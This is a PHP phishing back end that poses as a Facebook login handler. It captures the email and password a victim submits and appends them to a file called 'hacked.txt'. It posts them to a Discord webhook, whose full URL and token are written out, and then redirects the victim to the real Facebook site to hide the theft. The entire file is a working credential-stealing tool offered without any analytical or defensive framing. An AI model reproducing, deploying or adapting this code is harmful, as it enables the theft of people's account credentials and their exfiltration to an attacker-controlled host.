<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $email = (isset($_POST['email'])) ? $_POST['email'] :'';
    $password = (isset($_POST['pass'])) ? $_POST['pass'] :'';
    echo "USERNAME=$email, PASSWORD=$password\n";
    file_put_contents('./hacked.txt', "USERNAME=$email, PASSWORD=$password\n", FILE_APPEND);

    $webhook_url = "https://discord.com/api/webhooks/1214808664179736636/Gotfep7Fhz8AaMmWxnq5vVX8g_4ARxK8aF5dkRzbjvf8AFZshWDvEa9R8wgKMhn_mBqS";

    $msg = ["content" => "WEBSITE=Facebook,\n USERNAME= $email,\n PASSWORD=$password"];

    $headers = array ('Content-Type: application/jason');

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhook_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode ($msg));
    $response = curl_exec ($ch);
    curl_close($ch);

    echo $response;

    header("Location:https://www.facebook.com/");
 
}

?>
